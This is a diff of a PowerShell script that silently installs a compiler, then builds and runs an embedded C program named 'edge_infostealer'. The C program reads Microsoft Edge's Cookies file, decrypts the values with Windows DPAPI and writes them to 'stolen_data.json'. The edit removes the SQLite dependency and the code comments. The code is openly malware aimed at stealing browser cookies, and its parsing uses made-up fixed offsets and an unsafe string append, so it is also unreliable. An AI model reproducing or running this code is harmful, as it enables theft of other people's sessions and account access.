@@ -9,17 +9,6 @@ Invoke-WebRequest -Uri $w64devkitUrl -OutFile $w64devkitExe
 # Run the w64devkit installer
 Start-Process -FilePath $w64devkitExe -ArgumentList "/SILENT" -Wait
 
-# Define the URL for SQLite amalgamation
-$sqliteUrl = "https://www.sqlite.org/2024/sqlite-amalgamation-3400000.zip"
-$sqliteZip = "sqlite-amalgamation.zip"
-$sqliteDir = "sqlite-amalgamation"
-
-# Download SQLite amalgamation
-Invoke-WebRequest -Uri $sqliteUrl -OutFile $sqliteZip
-
-# Extract SQLite amalgamation
-Expand-Archive -Path $sqliteZip -DestinationPath $sqliteDir
-
 # Define the C program
 $cProgram = @"
 #include <stdio.h>
@@ -30,7 +19,6 @@ $cProgram = @"
 
 #pragma comment(lib, "crypt32.lib")
 
-// Function to decrypt Edge data
 char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len) {
     DATA_BLOB DataIn;
     DATA_BLOB DataOut;
@@ -49,7 +37,6 @@ char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len)
     return decrypted_value;
 }
 
-// Function to read cookies from the file system
 void read_edge_cookies() {
     const char* db_path = getenv("LOCALAPPDATA");
     strcat(db_path, "\\Microsoft\\Edge\\User Data\\Default\\Cookies");
@@ -60,7 +47,6 @@ void read_edge_cookies() {
         return;
     }
 
-    // Read the file content
     fseek(file, 0, SEEK_END);
     long file_size = ftell(file);
     fseek(file, 0, SEEK_SET);
@@ -69,18 +55,16 @@ void read_edge_cookies() {
     fread(buffer, 1, file_size, file);
     fclose(file);
 
-    // Parse the cookies (this is a simplified example and may not cover all cases)
     FILE* output_file = fopen("stolen_data.json", "w");
     if (output_file) {
         fprintf(output_file, "[\n");
         int first = 1;
         for (long i = 0; i < file_size; i++) {
             if (buffer[i] == 0x00 && buffer[i + 1] == 0x00 && buffer[i + 2] == 0x00 && buffer[i + 3] == 0x00) {
-                // Found a potential cookie entry (simplified check)
                 const char* host_key = (const char*)&buffer[i + 4];
                 const char* name = (const char*)&buffer[i + 20];
                 const unsigned char* encrypted_value = &buffer[i + 40];
-                int encrypted_len = 16; // Example length
+                int encrypted_len = 16;
 
                 char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
                 if (decrypted_value) {
@@ -114,9 +98,7 @@ Set-Content -Path $cProgramPath -Value $cProgram
 # Compile the C program using w64devkit
 $w64devkitBin = "C:\w64devkit\bin"
 $gccPath = Join-Path -Path $w64devkitBin -ChildPath "gcc.exe"
-$sqliteInclude = "C:\sqlite-amalgamation"
-$sqliteLib = "C:\sqlite-amalgamation"
-$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -I$sqliteInclude -L$sqliteLib -lcrypt32 -lsqlite3"
+$compileCommand = "$gccPath edge_infostealer.c -o edge_infostealer -lcrypt32"
 Invoke-Expression $compileCommand
 
 # Run the compiled executable
